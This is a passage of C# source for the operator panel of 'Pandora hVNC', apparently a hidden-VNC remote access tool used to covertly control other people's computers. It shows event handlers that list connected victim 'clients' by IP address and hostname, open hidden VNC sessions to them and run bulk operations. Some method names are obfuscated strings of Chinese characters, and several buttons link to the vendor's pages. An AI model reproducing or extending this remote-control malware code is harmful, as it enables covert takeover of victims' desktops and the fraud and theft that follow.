                MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            FrmVNC frmVNC = new FrmVNC();
            foreach (object selectedItem in HVNCList.SelectedItems)
            {
                _ = selectedItem;
                count = HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            checked
            {
                try
                {
                    if (HVNCList.FocusedItem.Index == -1)
                    {
                        return;
                    }
                    int num = Application.OpenForms.Count - 1;
                    while (true)
                    {
                        if (num >= 0)
                        {
                            if (Application.OpenForms[num].Tag == _clientList[HVNCList.FocusedItem.Index])
                            {
                                break;
                            }
                            num += -1;
                            continue;
                        }
                        FrmVNC obj = new FrmVNC
                        {
                            Name = "VNCForm:" + Conversions.ToString(_clientList[HVNCList.FocusedItem.Index].GetHashCode()),
                            Tag = _clientList[HVNCList.FocusedItem.Index]
                        };
                        string text = HVNCList.FocusedItem.SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        string text2 = HVNCList.FocusedItem.SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        xxip = text;
                        xxhostname = text2;
                        obj.Text = text + ":" + text2;
                        obj.Show();
                        return;
                    }
                    Application.OpenForms[num].Show();
                }
                catch (Exception)
                {
                    MessageBox.Show("You have to select a client first!", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
            }
        }

        private void Guna2CirclePictureBox3_Click(object sender, EventArgs e)
        {
            FrmMain frmMain = new FrmMain();
            frmMain.WindowState = FormWindowState.Minimized;
        }

        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            FrmVNC frmVNC = new FrmVNC();
            foreach (object selectedItem in HVNCList.SelectedItems)
            {
                _ = selectedItem;
                count = HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                frmVNC.ResetScale();
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void 谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道_Click(object sender, EventArgs e)
        {

        }

        private void 式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中_Click(object sender, EventArgs e)
        {

        }

        private void 要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三_Click(object sender, EventArgs e)
        {

        }

        private void Guna2GradientButton2_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/Andromeda-Software-LTD");

        }

        private void Guna2GradientButton8_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/Andromeda-Software-LTD");

        }

        private void Guna2GradientButton3_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://andromedasoftware.com.br");
        }

        private void Guna2GradientButton1_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.youtube.com/@Andromeda_Software_LTD");
        }
    }
}
